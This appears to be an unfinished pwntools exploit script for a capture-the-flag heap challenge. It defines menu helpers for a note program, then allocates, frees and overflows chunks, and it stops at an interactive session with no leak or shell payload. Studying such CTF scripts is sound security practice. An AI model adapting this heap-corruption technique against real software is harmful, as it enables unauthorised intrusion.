#!/usr/bin/python3

from pwn import *

exe = ELF("./pwn6_patched")
libc = ELF("./libc.so.6")

context.binary = exe

s   = lambda data: p.send(data)
sa  = lambda msg, data: p.sendafter(msg, data)
sl  = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn  = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+78
        c
        ''')
        input()

def create(index, title_size, title, content_size, content):
    slna(b'> ', 1)
    slna(b'Index: ', index)
    slna(b'Title size: ', title_size)
    sla(b'Title: ', title)
    slna(b'Content size: ', content_size)
    sla(b'Content: ', content)

def edit_title(new_title):
    sla(b'New title: ', new_title)
    slna(b'> ', 3)

def edit_content(content_size, content):
    slna(b'Content size: ', content_size)
    sla(b'Content: ', content)
    slna(b'> ', 3)

def edit(index, option, new_title, content_size, content):
    slna(b'> ', 2)
    slna(b'Index: ', index)
    slna(b'> ', option)
    if(option == 1):
        edit_title(new_title)
    elif(option == 2):
        edit_content(content_size, content)

def show(index):
    slna(b'> ', 3)
    slna(b'Index: ', index)

def dell(index):
    slna(b'> ', 4)
    slna(b'Index: ', index)

if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])

# create(0, 0x80, b'a'* 0x80, 0x60, b'b'*0x60)
# edit(0, 1, b'a'*0x80, 0, 0)
# create(1, 0x100, b'a'* 0x100, 0x100, b'b'*0x100)
# create(2, 0x100, b'a'* 0x100, 0x100, b'b'*0x100)
# create(3, 0x100, b'a'* 0x100, 0x100, b'b'*0x100)
# create(4, 0x100, b'a'* 0x100, 0x100, b'b'*0x100)
# create(5, 0x100, b'a'* 0x100, 0x100, b'b'*0x100)
# create(6, 0x100, b'a'* 0x100, 0x100, b'b'*0x100)
# create(7, 0x100, b'a'* 0x100, 0x100, b'b'*0x100)
# for i in range(0, 7):
#     dell(i)
create(0,0x80,b'title',0x80,b'content')
create(1,0x80,b'title',0x80,b'content')
create(2,0x80,b'title',0x80,b'content')
create(3,0x80,b'title',0x60,b'content') 
GDB()
create(5,0x80,b'title',0x60,b'content')

dell(0)

dell(1)
dell(2)
dell(3)


edit(5, 1, b'a'*0x80, 0, 0)
edit(5, 2, 0, 0x130, b'new content')


p.interactive()

